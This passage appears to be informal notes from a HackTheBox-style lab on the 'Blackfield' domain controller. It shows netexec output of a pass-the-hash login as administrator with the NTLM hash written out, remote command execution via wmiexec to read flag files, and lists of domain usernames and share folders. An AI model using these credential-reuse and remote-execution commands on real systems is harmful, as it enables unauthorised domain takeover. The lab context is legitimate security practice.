SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\administrator:184fb5e5178480be64824d4cd53b99ee (Pwn3d!)                                                                                                             
SMB         10.10.10.192    445    DC01             [+] Executed command via wmiexec                                                                                                                                                         
SMB         10.10.10.192    445    DC01             #< CLIXML                                                                                                                                                                                
SMB         10.10.10.192    445    DC01             4375a629c7c67c8e29db269060c955cb                                                                                                                                                         
SMB         10.10.10.192    445    DC01             <Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>                                         
kali@kali ~> nxc smb blackfield.local -u administrator -H 184fb5e5178480be64824d4cd53b99ee -X 'cat c:\users\svc_backup\desktop\user.txt'
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)                                                                          
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\administrator:184fb5e5178480be64824d4cd53b99ee (Pwn3d!)                                                                                                             
SMB         10.10.10.192    445    DC01             [+] Executed command via wmiexec                                                                                                                                                         
SMB         10.10.10.192    445    DC01             #< CLIXML                                                                                                                                                                                
SMB         10.10.10.192    445    DC01             3920bb317a0bef51027e2852be64b543                                                                                                                                                         
SMB         10.10.10.192    445    DC01             <Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>                                         
kali@kali ~> 

```



???

from the users filke

```
BLACKFIELD532412
BLACKFIELD996878
BLACKFIELD653097
BLACKFIELD438814
svc_backup
lydericlefebvre
PC01$
PC02$
PC03$
PC04$

```


the user here 

```
drw-rw-rw-          0  Wed Jun  3 12:47:12 2020 LKnade
drw-rw-rw-          0  Wed Jun  3 12:47:12 2020 LKrioua
drw-rw-rw-          0  Wed Jun  3 12:47:12 2020 LLefebvre  <----------------
drw-rw-rw-          0  Wed Jun  3 12:47:12 2020 LLoeradeavilez
drw-rw-rw-          0  Wed Jun  3 12:47:12 2020 LMichoud
drw-rw-rw-          0  Wed Jun  3 12:47:12 2020 LTindall
drw-rw-rw-          0  Wed Jun  3 12:47:12 2020 LYturbe
drw-rw-rw-          0  Wed Jun  3 12:47:12 2020 MArcynski

```


emtpy sadly

